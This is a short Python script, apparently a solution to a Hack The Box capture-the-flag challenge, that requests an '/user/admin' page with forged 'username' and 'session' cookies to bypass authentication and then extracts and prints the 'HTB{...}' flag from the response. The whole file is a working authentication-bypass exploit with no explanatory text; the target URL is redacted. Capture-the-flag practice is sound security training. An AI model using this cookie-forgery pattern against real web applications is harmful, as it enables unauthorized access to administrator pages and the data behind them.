import requests

USERNAME = "noexist"
BASE_URL = "REDACTED"

resp = requests.get(f"{BASE_URL}/user/admin", cookies={"username": USERNAME, "session":"dummy"})
if resp.ok:
    flag_start = resp.text.find("HTB{")
    flag_end = resp.text.find("}", flag_start) + 1
    print(f"[+] Flag: {resp.text[flag_start:flag_end]}")
